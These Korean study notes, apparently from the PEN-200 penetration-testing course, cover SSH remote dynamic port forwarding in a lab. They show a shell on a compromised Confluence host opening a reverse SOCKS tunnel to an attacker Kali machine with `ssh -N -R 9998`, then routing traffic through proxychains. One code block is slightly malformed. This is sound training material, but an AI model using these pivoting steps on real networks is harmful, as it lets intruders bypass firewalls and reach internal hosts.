# 19.3.4 SSH 원격 동적 포워딩

> **SSH Remote Dynamic Port Forwarding** · PEN-200 §19.3.4

원격 포워딩도 로컬 포워딩과 같은 제약을 물려받음 — **연결 하나당 소켓 하나**라 열거 단계에서 특히 답답함. 원격 동적 포워딩이 그 둘의 장점을 합침: SOCKS 프록시 포트가 **SSH 서버(Kali)** 에 바인드되고, 패킷 전달은 **SSH 클라이언트(장악한 호스트)** 가 함. 결과적으로 Kali 의 포트 하나로 CONFLUENCE01 이 닿는 모든 호스트·포트에 접근함.

⚠️ 버전 제약이 있음 — 2017년 10월 **OpenSSH 7.6** 부터 지원됨. 단 **7.6 이상이어야 하는 것은 클라이언트뿐이고 서버 버전은 무관**함. 장악한 호스트의 `ssh -V` 를 확인할 것.

시나리오는 앞 절의 연장임. DMZ 에서 Windows 서버 MULTISERVER03 을 발견했는데 방화벽 탓에 Kali 에서는 MULTISERVER03 의 어떤 포트에도, CONFLUENCE01 의 TCP/8090 외 어떤 포트에도 붙을 수 없음. 그러나 CONFLUENCE01 에서 Kali 로 나가는 SSH 는 가능함.

![[PEN200-Fig-280.png]]
*원격 동적 포워딩 — Kali 루프백 9998 의 SOCKS 프록시로 보낸 패킷이 CONFLUENCE01 에서 주소대로 전달됨*

**혼동 지점 — 옵션이 원격 포워딩과 똑같은 `-R` 임.** 구분은 인자 개수로 함: 소켓을 **하나만** 넘기면 그것이 SSH 서버에 열 리스닝 소켓이고 동적 포워딩이 됨. IP 를 생략하고 포트만 적으면 **SSH 서버의 루프백**에 바인드됨. 그래서 CONFLUENCE01 에서 실행할 명령은 `-R 9998` 하나로 끝나고, `-N` 으로 셸을 막음.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c 'import pty;
pty.spawn("/bin/bash")'
<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'
confluence@confluence01:/opt/atlassian/confluence/bin$ ssh -N -R 9998
kali@192.168.118.4
<n/confluence/bin$ ssh -N -R 9998 kali@192.168.118.4
Could not create directory '/home/confluence/.ssh'.

yes

Kali 에서 `sudo ss -ntplu` 로 보면 `127.0.0.1:9998` 과 `[::1]:9998` 양쪽에 `sshd` 소유로 바인드돼 있음.

```

나머지는 일반 동적 포워딩과 같음 — `/etc/proxychains4.conf` 를 새 SOCKS 포트로 고침. 주소가 CONFLUENCE01 의 WAN 이 아니라 **Kali 자신의 루프백**이라는 점만 다름.

```
kali@kali:~$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9998
```
